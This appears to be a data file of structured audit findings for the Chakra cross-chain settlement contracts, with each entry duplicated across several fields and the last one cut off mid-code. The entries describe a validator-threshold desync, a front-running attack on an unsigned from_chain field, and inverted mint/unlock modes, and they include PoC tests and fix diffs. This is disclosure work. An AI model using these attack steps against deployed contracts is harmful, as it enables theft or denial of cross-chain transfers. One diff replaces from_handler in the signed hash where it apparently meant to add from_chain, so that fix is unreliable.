{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-008", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 8, "page_start": null, "title": "SettlementSignatureVerifier's required_validators is not updated, resulting in a low or high number of signatures being required", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/settlement/contracts/BaseSettlement.sol#L121-L126\n\n\n# Vulnerability details\n\n## Impact\n\nThe `required_validators` in `SettlementSignatureVerifier` is not updated when updating `BaseSettlement`'s. This results in either fewer or more signatures being required when verify.\n\n## Proof of Concept\n\nThe functions `BaseSettlement.add_validator` and `BaseSettlement.remove_validator` in the BaseSettlement contract also update the validators of the SignatureVerifier contract. However, the function `BaseSettlement.set_required_validators_num` does not call `SettlementSignatureVerifier.set_required_validators_num`. Therefore, the number of required validator signatures will not be set.\n\n```solidity\nfunction set_required_validators_num(\n    uint256 _required_validators\n) external onlyRole(MANAGER_ROLE) {\n    uint256 old = required_validators;\n    required_validators = _required_validators;\n    emit RequiredValidatorsChanged(msg.sender, old, required_validators);\n}\n```\n\nThis is PoC. You can add it to `solidity/settlement/test/ChakraSettlement.ts` and run it.\n\n```jsx\nit('PoC set_required_validators_num', async () => {\n    const { settlmentInstance, verifierInstance, manager } = await loadFixture(deploySettlementFixture)\n    await settlmentInstance.connect(manager).set_required_validators_num(3);\n\n    expect(await settlmentInstance.required_validators()).to.equal(3);\n    expect(await verifierInstance.required_validators()).to.equal(2); // does not changed\n});\n```\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nCall `SettlementSignatureVerifier.set_required_validators_num` at `BaseSettlement.set_required_validators_num` .\n\n```diff\nfunction set_required_validators_num(\n    uint256 _required_validators\n) external onlyRole(MANAGER_ROLE) {\n+   signature_verifier.set_required_validators_num(_required_validators);\n    uint256 old = required_validators;\n    required_validators = _required_validators;\n    emit RequiredValidatorsChanged(msg.sender, old, required_validators);\n}\n```\n\n\n## Assessed type\n\nOther\n", "sections": {"description_md": null, "impact_md": "## Impact\n\nThe `required_validators` in `SettlementSignatureVerifier` is not updated when updating `BaseSettlement`'s. This results in either fewer or more signatures being required when verify.\n", "recommendation_md": "## Recommended Mitigation Steps\n\nCall `SettlementSignatureVerifier.set_required_validators_num` at `BaseSettlement.set_required_validators_num` .\n\n```diff\nfunction set_required_validators_num(\n    uint256 _required_validators\n) external onlyRole(MANAGER_ROLE) {\n+   signature_verifier.set_required_validators_num(_required_validators);\n    uint256 old = required_validators;\n    required_validators = _required_validators;\n    emit RequiredValidatorsChanged(msg.sender, old, required_validators);\n}\n```\n\n\n## Assessed type\n\nOther\n", "poc_md": "## Proof of Concept\n\nThe functions `BaseSettlement.add_validator` and `BaseSettlement.remove_validator` in the BaseSettlement contract also update the validators of the SignatureVerifier contract. However, the function `BaseSettlement.set_required_validators_num` does not call `SettlementSignatureVerifier.set_required_validators_num`. Therefore, the number of required validator signatures will not be set.\n\n```solidity\nfunction set_required_validators_num(\n    uint256 _required_validators\n) external onlyRole(MANAGER_ROLE) {\n    uint256 old = required_validators;\n    required_validators = _required_validators;\n    emit RequiredValidatorsChanged(msg.sender, old, required_validators);\n}\n```\n\nThis is PoC. You can add it to `solidity/settlement/test/ChakraSettlement.ts` and run it.\n\n```jsx\nit('PoC set_required_validators_num', async () => {\n    const { settlmentInstance, verifierInstance, manager } = await loadFixture(deploySettlementFixture)\n    await settlmentInstance.connect(manager).set_required_validators_num(3);\n\n    expect(await settlmentInstance.required_validators()).to.equal(3);\n    expect(await verifierInstance.required_validators()).to.equal(2); // does not changed\n});\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/settlement/contracts/BaseSettlement.sol#L121-L126\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/settlement/contracts/BaseSettlement.sol#L121-L126\n\n\n# Vulnerability details\n\n## Impact\n\nThe `required_validators` in `SettlementSignatureVerifier` is not updated when updating `BaseSettlement`'s. This results in either fewer or more signatures being required when verify.\n\n## Proof of Concept\n\nThe functions `BaseSettlement.add_validator` and `BaseSettlement.remove_validator` in the BaseSettlement contract also update the validators of the SignatureVerifier contract. However, the function `BaseSettlement.set_required_validators_num` does not call `SettlementSignatureVerifier.set_required_validators_num`. Therefore, the number of required validator signatures will not be set.\n\n```solidity\nfunction set_required_validators_num(\n    uint256 _required_validators\n) external onlyRole(MANAGER_ROLE) {\n    uint256 old = required_validators;\n    required_validators = _required_validators;\n    emit RequiredValidatorsChanged(msg.sender, old, required_validators);\n}\n```\n\nThis is PoC. You can add it to `solidity/settlement/test/ChakraSettlement.ts` and run it.\n\n```jsx\nit('PoC set_required_validators_num', async () => {\n    const { settlmentInstance, verifierInstance, manager } = await loadFixture(deploySettlementFixture)\n    await settlmentInstance.connect(manager).set_required_validators_num(3);\n\n    expect(await settlmentInstance.required_validators()).to.equal(3);\n    expect(await verifierInstance.required_validators()).to.equal(2); // does not changed\n});\n```\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nCall `SettlementSignatureVerifier.set_required_validators_num` at `BaseSettlement.set_required_validators_num` .\n\n```diff\nfunction set_required_validators_num(\n    uint256 _required_validators\n) external onlyRole(MANAGER_ROLE) {\n+   signature_verifier.set_required_validators_num(_required_validators);\n    uint256 old = required_validators;\n    required_validators = _required_validators;\n    emit RequiredValidatorsChanged(msg.sender, old, required_validators);\n}\n```\n\n\n## Assessed type\n\nOther\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/settlement/contracts/BaseSettlement.sol#L121-L126\n\n\n# Vulnerability details\n\n## Impact\n\nThe `required_validators` in `SettlementSignatureVerifier` is not updated when updating `BaseSettlement`'s. This results in either fewer or more signatures being required when verify.\n\n## Proof of Concept\n\nThe functions `BaseSettlement.add_validator` and `BaseSettlement.remove_validator` in the BaseSettlement contract also update the validators of the SignatureVerifier contract. However, the function `BaseSettlement.set_required_validators_num` does not call `SettlementSignatureVerifier.set_required_validators_num`. Therefore, the number of required validator signatures will not be set.\n\n```solidity\nfunction set_required_validators_num(\n    uint256 _required_validators\n) external onlyRole(MANAGER_ROLE) {\n    uint256 old = required_validators;\n    required_validators = _required_validators;\n    emit RequiredValidatorsChanged(msg.sender, old, required_validators);\n}\n```\n\nThis is PoC. You can add it to `solidity/settlement/test/ChakraSettlement.ts` and run it.\n\n```jsx\nit('PoC set_required_validators_num', async () => {\n    const { settlmentInstance, verifierInstance, manager } = await loadFixture(deploySettlementFixture)\n    await settlmentInstance.connect(manager).set_required_validators_num(3);\n\n    expect(await settlmentInstance.required_validators()).to.equal(3);\n    expect(await verifierInstance.required_validators()).to.equal(2); // does not changed\n});\n```\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nCall `SettlementSignatureVerifier.set_required_validators_num` at `BaseSettlement.set_required_validators_num` .\n\n```diff\nfunction set_required_validators_num(\n    uint256 _required_validators\n) external onlyRole(MANAGER_ROLE) {\n+   signature_verifier.set_required_validators_num(_required_validators);\n    uint256 old = required_validators;\n    required_validators = _required_validators;\n    emit RequiredValidatorsChanged(msg.sender, old, required_validators);\n}\n```\n\n\n## Assessed type\n\nOther"}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-011", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 11, "page_start": null, "title": "Malicious actors can manipulate the `cross_chain_callback` callback", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/settlement/contracts/ChakraSettlement.sol#L305\n\n\n# Vulnerability details\n\n## Impact\nBecause the validator's signature message does not include the `from_chain` field, a malicious actor can preemptively execute the validator's transaction with an incorrect `from_chain` field. This can cause the status of `create_cross_txs[txid]` to become a `Failed` state, preventing it from being executed again.\n\n## Proof of Concept\n\nThis is the `receive_cross_chain_callback` function\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) external {\n        verifySignature(\n            txid,\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n        processCrossChainCallback(\n            txid,\n            from_chain,\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n        emitCrossChainResult(txid);\n    }\n```\nIn the signature verification process, we found that the signature message does not include the `from_chain` field.\n```solidity\n    function verifySignature(\n        uint256 txid,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal view {\n        bytes32 message_hash = keccak256(\n            abi.encodePacked(txid, from_handler, to_handler, status)\n        );\n\n        require(\n            signature_verifier.verify(message_hash, signatures, sign_type),\n            \"Invalid signature\"\n        );\n    }\n```\n\nIn this scenario, a malicious actor could execute the following attack steps:\n1. Front-run the caller's transaction, providing correct signatures and other parameters, but with an incorrect `from_chain` field, causing the verifySignature validation to pass.\n2. In the `processCrossChainCallback` function, call `handler::receive_cross_chain_callback`.\n3. Due to the incorrect `from_chain`, the `is_valid_handler` function returns false, which causes `handler::receive_cross_chain_callback` to return false.\n```solidity\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n```\n4. If `handler::receive_cross_chain_callback returns` false, it will cause `create_cross_txs[txid].status` to be set to `Failed`.\n```solidity\n        if (\n            ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n```\n## Tools Used\nManual Review\n## Recommended Mitigation Steps\n```diff\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) external {\n        verifySignature(\n            txid,\n+           from_chain\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n        ...\n    }\n```\n```diff\n    function verifySignature(\n        uint256 txid,\n+       string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal view {\n        bytes32 message_hash = keccak256(\n-            abi.encodePacked(txid, from_handler, to_handler, status)\n+            abi.encodePacked(txid, from_chain, to_handler, status)\n        );\n\n        require(\n            signature_verifier.verify(message_hash, signatures, sign_type),\n            \"Invalid signature\"\n        );\n    }\n```\n\n\n## Assessed type\n\nMEV\n", "sections": {"description_md": null, "impact_md": "## Impact\nBecause the validator's signature message does not include the `from_chain` field, a malicious actor can preemptively execute the validator's transaction with an incorrect `from_chain` field. This can cause the status of `create_cross_txs[txid]` to become a `Failed` state, preventing it from being executed again.\n", "recommendation_md": "## Recommended Mitigation Steps\n```diff\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) external {\n        verifySignature(\n            txid,\n+           from_chain\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n        ...\n    }\n```\n```diff\n    function verifySignature(\n        uint256 txid,\n+       string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal view {\n        bytes32 message_hash = keccak256(\n-            abi.encodePacked(txid, from_handler, to_handler, status)\n+            abi.encodePacked(txid, from_chain, to_handler, status)\n        );\n\n        require(\n            signature_verifier.verify(message_hash, signatures, sign_type),\n            \"Invalid signature\"\n        );\n    }\n```\n\n\n## Assessed type\n\nMEV\n", "poc_md": "## Proof of Concept\n\nThis is the `receive_cross_chain_callback` function\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) external {\n        verifySignature(\n            txid,\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n        processCrossChainCallback(\n            txid,\n            from_chain,\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n        emitCrossChainResult(txid);\n    }\n```\nIn the signature verification process, we found that the signature message does not include the `from_chain` field.\n```solidity\n    function verifySignature(\n        uint256 txid,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal view {\n        bytes32 message_hash = keccak256(\n            abi.encodePacked(txid, from_handler, to_handler, status)\n        );\n\n        require(\n            signature_verifier.verify(message_hash, signatures, sign_type),\n            \"Invalid signature\"\n        );\n    }\n```\n\nIn this scenario, a malicious actor could execute the following attack steps:\n1. Front-run the caller's transaction, providing correct signatures and other parameters, but with an incorrect `from_chain` field, causing the verifySignature validation to pass.\n2. In the `processCrossChainCallback` function, call `handler::receive_cross_chain_callback`.\n3. Due to the incorrect `from_chain`, the `is_valid_handler` function returns false, which causes `handler::receive_cross_chain_callback` to return false.\n```solidity\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n```\n4. If `handler::receive_cross_chain_callback returns` false, it will cause `create_cross_txs[txid].status` to be set to `Failed`.\n```solidity\n        if (\n            ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/settlement/contracts/ChakraSettlement.sol#L305\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/settlement/contracts/ChakraSettlement.sol#L305\n\n\n# Vulnerability details\n\n## Impact\nBecause the validator's signature message does not include the `from_chain` field, a malicious actor can preemptively execute the validator's transaction with an incorrect `from_chain` field. This can cause the status of `create_cross_txs[txid]` to become a `Failed` state, preventing it from being executed again.\n\n## Proof of Concept\n\nThis is the `receive_cross_chain_callback` function\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) external {\n        verifySignature(\n            txid,\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n        processCrossChainCallback(\n            txid,\n            from_chain,\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n        emitCrossChainResult(txid);\n    }\n```\nIn the signature verification process, we found that the signature message does not include the `from_chain` field.\n```solidity\n    function verifySignature(\n        uint256 txid,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal view {\n        bytes32 message_hash = keccak256(\n            abi.encodePacked(txid, from_handler, to_handler, status)\n        );\n\n        require(\n            signature_verifier.verify(message_hash, signatures, sign_type),\n            \"Invalid signature\"\n        );\n    }\n```\n\nIn this scenario, a malicious actor could execute the following attack steps:\n1. Front-run the caller's transaction, providing correct signatures and other parameters, but with an incorrect `from_chain` field, causing the verifySignature validation to pass.\n2. In the `processCrossChainCallback` function, call `handler::receive_cross_chain_callback`.\n3. Due to the incorrect `from_chain`, the `is_valid_handler` function returns false, which causes `handler::receive_cross_chain_callback` to return false.\n```solidity\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n```\n4. If `handler::receive_cross_chain_callback returns` false, it will cause `create_cross_txs[txid].status` to be set to `Failed`.\n```solidity\n        if (\n            ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n```\n## Tools Used\nManual Review\n## Recommended Mitigation Steps\n```diff\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) external {\n        verifySignature(\n            txid,\n+           from_chain\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n        ...\n    }\n```\n```diff\n    function verifySignature(\n        uint256 txid,\n+       string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal view {\n        bytes32 message_hash = keccak256(\n-            abi.encodePacked(txid, from_handler, to_handler, status)\n+            abi.encodePacked(txid, from_chain, to_handler, status)\n        );\n\n        require(\n            signature_verifier.verify(message_hash, signatures, sign_type),\n            \"Invalid signature\"\n        );\n    }\n```\n\n\n## Assessed type\n\nMEV\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/abef77d95866f2fec93270491fc5abc9ab14f86d/solidity/settlement/contracts/ChakraSettlement.sol#L305\n\n\n# Vulnerability details\n\n## Impact\nBecause the validator's signature message does not include the `from_chain` field, a malicious actor can preemptively execute the validator's transaction with an incorrect `from_chain` field. This can cause the status of `create_cross_txs[txid]` to become a `Failed` state, preventing it from being executed again.\n\n## Proof of Concept\n\nThis is the `receive_cross_chain_callback` function\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) external {\n        verifySignature(\n            txid,\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n        processCrossChainCallback(\n            txid,\n            from_chain,\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n        emitCrossChainResult(txid);\n    }\n```\nIn the signature verification process, we found that the signature message does not include the `from_chain` field.\n```solidity\n    function verifySignature(\n        uint256 txid,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal view {\n        bytes32 message_hash = keccak256(\n            abi.encodePacked(txid, from_handler, to_handler, status)\n        );\n\n        require(\n            signature_verifier.verify(message_hash, signatures, sign_type),\n            \"Invalid signature\"\n        );\n    }\n```\n\nIn this scenario, a malicious actor could execute the following attack steps:\n1. Front-run the caller's transaction, providing correct signatures and other parameters, but with an incorrect `from_chain` field, causing the verifySignature validation to pass.\n2. In the `processCrossChainCallback` function, call `handler::receive_cross_chain_callback`.\n3. Due to the incorrect `from_chain`, the `is_valid_handler` function returns false, which causes `handler::receive_cross_chain_callback` to return false.\n```solidity\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n```\n4. If `handler::receive_cross_chain_callback returns` false, it will cause `create_cross_txs[txid].status` to be set to `Failed`.\n```solidity\n        if (\n            ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n```\n## Tools Used\nManual Review\n## Recommended Mitigation Steps\n```diff\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) external {\n        verifySignature(\n            txid,\n+           from_chain\n            from_handler,\n            to_handler,\n            status,\n            sign_type,\n            signatures\n        );\n        ...\n    }\n```\n```diff\n    function verifySignature(\n        uint256 txid,\n+       string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal view {\n        bytes32 message_hash = keccak256(\n-            abi.encodePacked(txid, from_handler, to_handler, status)\n+            abi.encodePacked(txid, from_chain, to_handler, status)\n        );\n\n        require(\n            signature_verifier.verify(message_hash, signatures, sign_type),\n            \"Invalid signature\"\n        );\n    }\n```\n\n\n## Assessed type\n\nMEV"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-030", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 30, "page_start": null, "title": "The LockMint and BurnUnlock modes cannot be used", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L127\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/ChakraSettlementHandler.sol#L338\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L127\n\n\n# Vulnerability details\n\n## Impact\n`LockMint` and `BurnUnlock` modes refer to the following:\n\n- `LockMint`: Tokens are locked on the source chain and minted on the target chain.\n- `BurnUnlock`: Tokens are burned on the source chain and unlocked on the target chain.\n\nHowever, because the `ChakraSettlementHandler` protocol is responsible for both processing remote `cross-chain messages` and sending `cross-chain messages` to remote chains, a single mode setting cannot handle both tasks simultaneously. This results in one of the tasks' functionalities being unavailable due to incorrect protocol implementation.\n\n\n## Proof of Concept\nWhen the `LockMint` mode is used, it means that the source chain employs the `LockUnlock` mode. Therefore, during the receive cross-chain message, tokens should not be minted but rather unlocked.\n\nSimilarly, when the `BurnUnlock` mode is used, it means that the source chain employs the `MintBurn` mode. Thus, during the receive cross-chain message, tokens should not be unlocked but rather minted.\n\n```solidity\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n        ...\n        if (payload_type == PayloadType.ERC20) {\n            {\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n                if (mode == SettlementMode.MintBurn) {\n                    ...\n                } else if (mode == SettlementMode.LockUnlock) {\n                    ...\n                } else if (mode == SettlementMode.LockMint) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                }\n            }\n        }\n        ...\n    }\n```\n\n\nIn the Cairo program, the same issue also exists.\n```rust\n    #[abi(embed_v0)]\n    impl ERC20HandlerImpl of IERC20Handler<ContractState> {\n        fn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let message :Message= decode_message(payload);\n            let payload_type = message.payload_type;\n            assert(payload_type == PayloadType::ERC20, 'payload type not erc20');\n            let payload_transfer = message.payload;\n            let transfer = decode_transfer(payload_transfer);\n            assert(transfer.method_id == ERC20Method::TRANSFER, 'ERC20Method must TRANSFER');\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockMint{\n                erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::BurnUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }else if self.mode.read() == SettlementMode::LockUnlock{\n                token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n            }\n\n            return true;\n        }\n```\n## Tools Used\nManual Review\n## Recommended Mitigation Steps\nThe following is the correct logic:\n```diff\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n        bytes calldata msg_payload = MessageV1Codec.payload(payload);\n\n        require(isValidPayloadType(payload_type), \"Invalid payload type\");\n\n        if (payload_type == PayloadType.ERC20) {\n            // Cross chain transfer\n            {\n                // Decode transfer payload\n                ERC20TransferPayload memory transfer_payload = codec\n                    .deocde_transfer(msg_payload);\n\n                if (mode == SettlementMode.MintBurn) {\n                    _erc20_mint(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n                    return true;\n                } else if (mode == SettlementMode.LockUnlock) {\n                    _erc20_unlock(\n                        AddressCast.to_address(transfer_payload.to),\n                        transfer_payload.amount\n                    );\n\n                    return true;\n                } else if (mode == SettlementMode.LockMint) {\n-                   _erc20_mint(\n-                       AddressCast.to_address(transfer_payload.to),\n-                       transfer_payload.amount\n-                   );\n+                   _erc20_unlock(\n+                       AddressCast.to_address(transfer_payload.to),\n+                       transfer_payload.amount\n+                   );\n                    return true;\n                } else if (mode == SettlementMode.BurnUnlock) {\n-                   _erc20_unlock(\n-                       AddressCast.to_address(transfer_payload.to),\n-                       transfer_payload.amount\n-                   );\n+                   _erc20_mint(\n+                       AddressCast.to_address(transfer_payload.to),\n+                       transfer_payload.amount\n+                   );\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n```\nIn Cairo:\n```diff\n    impl ERC20HandlerImpl of IERC20Handler<ContractState> {\n        fn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let message :Message= decode_message(payload);\n            let payload_type = message.payload_type;\n            assert(payload_type == PayloadType::ERC20, 'payload type not erc20');\n            let payload_transfer = message.payload;\n            let transfer = 